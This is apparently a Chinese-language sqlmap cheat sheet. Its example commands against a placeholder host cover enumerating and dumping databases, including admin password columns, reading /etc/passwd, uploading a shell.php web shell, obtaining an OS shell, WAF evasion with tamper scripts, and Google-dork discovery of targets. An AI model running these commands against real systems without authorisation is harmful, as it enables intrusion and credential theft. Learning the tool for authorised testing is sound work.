# SQLMAP常用参数

## 一、目标指定类
### 1. -u 指定 GET 注入 URL

作用：传入带参数的目标链接

```
sqlmap -u "http://test.com/?id=1"
```

### 2. -r 加载抓包 HTTP 数据包
作用：读取保存的请求包，自动识别 POST/Cookie 注入

```
sqlmap -r http.txt
```

### 3. -p 只检测指定参数

作用：忽略其他参数，仅扫描指定参数

```
sqlmap -u "http://test.com/?id=1&page=2" -p id
```

### 4. --data POST 表单传参
作用：模拟 POST 提交数据

```
sqlmap -u "http://test.com/login.php" --data "user=1&pwd=1"
```

### 5. --cookie 自定义 Cookie
作用：携带 Cookie 访问页面
```
sqlmap -u "http://test.com/?id=1" --cookie="session=123456"

```


## 二、身份认证类
### 1. --auth-type=basic 开启 401 基础认证

### 2. --auth-cred=user:pass 账号密码
```
sqlmap -u "http://test.com" --auth-type=basic --auth-cred=admin:123456
```
### 3. --proxy 设置代理

```
sqlmap -u "http://test.com" --proxy http://127.0.0.1:8080
```

# 三、交互自动化
### --batch 自动确认所有交互

```
sqlmap -u "http://test.com/?id=1" --batch

```
# 四、查询数据库信息
### 1. --dbs 枚举全部数据库

```
sqlmap -u "http://test.com/?id=1" --batch --dbs

```
### 2. --current-db 当前使用数据库

```
sqlmap -u "http://test.com/?id=1" --batch --current-db

```
### 3. --current-user 当前数据库账号

```
sqlmap -u "http://test.com/?id=1" --batch --current-user

```
### 4. --version 数据库版本

```
sqlmap -u "http://test.com/?id=1" --batch --version

```
### 5. --is-dba 判断是否为管理员权限

```
sqlmap -u "http://test.com/?id=1" --batch --is-dba

```
# 五、库、表、字段操作
### 1. -D 指定数据库 + --tables 查表

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb --tables

```
### 2. -T 指定数据表 + --columns 查字段

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb -T admin --columns

```
### 3. --dump 导出表内所有数据

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb -T admin --dump

```
### 4. --dump-all 导出全部库表（速度慢）

```
sqlmap -u "http://test.com/?id=1" --batch --dump-all

```
# 六、自定义执行 SQL 语句
### --sql-query 手动执行查询

```
sqlmap -u "http://test.com/?id=1" --batch --sql-query "select username,password from admin"

```
# 七、盲注提速
### --threads 设置多线程

```
sqlmap -u "http://test.com/?id=1" --batch --threads 10

```
# 八、文件读写（高权限数据库可用）
### 1. --file-read 读取服务器文件

```
sqlmap -u "http://test.com/?id=1" --batch --file-read "C:/www/index.php"

```
### 2. --file-write 上传本地文件到服务器

```
sqlmap -u "http://test.com/?id=1" --batch --file-write shell.php --file-dest "C:/www/shell.php"

```
# 九、限定注入类型
B = 布尔盲注
T = 时间盲注
U = 联合注入

只使用布尔+时间盲注
```
sqlmap -u "http://test.com/?id=1" --batch --technique BT

```
# 十、清空历史扫描缓存
--flush-session

```
sqlmap -u "http://test.com/?id=1" --batch --flush-session

```

## 一、指定扫描目标
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| -u | --url | 单个注入URL | sqlmap -u "http://xxx.com/test.php?id=1" |
| -r | --request | 加载Burp抓包请求文件 | sqlmap -r burp.txt |
| -m | --massive | 批量扫描文本内所有URL | sqlmap -m url.txt |
| -d | --direct | 直连数据库（无网站） | sqlmap -d "mysql://root:123456@127.0.0.1:3306/database" |
| -g | --google-dork | Google语法批量找注入点 | sqlmap -g "inurl:php?id=" |

## 二、HTTP请求配置（Cookie/POST/代理/UA）
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| --data | --data | POST表单提交参数 | sqlmap -u url --data "username=1&password=2" |
| --cookie | --cookie | 携带登录Cookie | sqlmap -u url --cookie "PHPSESSID=xxxx" |
| --random-agent | --random-agent | 随机浏览器UA防拦截 | sqlmap -u url --random-agent |
| -H | --headers | 自定义请求头 | sqlmap -u url -H "Token:abc123" |
| --proxy | --proxy | 设置HTTP代理（配合Burp） | sqlmap -u url --proxy http://127.0.0.1:8080 |
| --delay | --delay | 请求延时，防WAF封禁 | sqlmap -u url --delay 1 |
| --timeout | --timeout | 请求超时时间 | sqlmap -u url --timeout 15 |

## 三、扫描强度与注入控制
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| --level | --level 1~5 | 探测等级，越高检测越全 | sqlmap -u url --level 5 |
| --risk | --risk 1~3 | 风险等级，3级会执行删改语句 | sqlmap -u url --risk 3 |
| -p | --parameter | 只扫描指定参数 | sqlmap -u url -p id |
| --dbms | --dbms | 指定数据库类型，减少探测 | sqlmap -u url --dbms mysql |

## 四、数据库查询（脱库核心参数）
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| --dbs | --databases | 查询全部数据库名 | sqlmap -u url --dbs |
| --current-db | --current-db | 获取当前连接数据库 | sqlmap -u url --current-db |
| --tables | --tables | 查询指定库下所有表 | sqlmap -u url -D testdb --tables |
| --columns | --columns | 查询表内字段名 | sqlmap -u url -D testdb -T user --columns |
| --dump | --dump | 导出表中全部数据 | sqlmap -u url -D testdb -T user --dump |
| --search | --search | 全局搜索表/字段 | sqlmap -u url --search -C password |

## 五、文件读写、系统交互
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| --file-read | --file-read | 读取服务器本地文件 | sqlmap -u url --file-read "/etc/passwd" |
| --file-write | --file-write | 上传本地文件到服务器 | sqlmap -u url --file-write shell.php --file-dest /var/www/html/shell.php |
| --os-shell | --os-shell | 获取系统交互shell | sqlmap -u url --os-shell |
| --os-cmd | --os-cmd | 执行单条系统命令 | sqlmap -u url --os-cmd "whoami" |

## 六、绕过WAF/防护、杂项
| 参数 | 完整参数 | 作用 | 命令示例 |
|------|----------|------|----------|
| --tamper | --tamper | 使用脚本绕过WAF | sqlmap -u url --tamper space2comment |
| --batch | --batch | 自动默认选择，无需人工交互 | sqlmap -u url --batch |
| --output-dir | --output-dir | 指定扫描结果保存目录 | sqlmap -u url --output-dir ./scan_result |
| --flush-session | --flush-session | 清空历史扫描缓存，重新扫描 | sqlmap -u url --flush-session |

















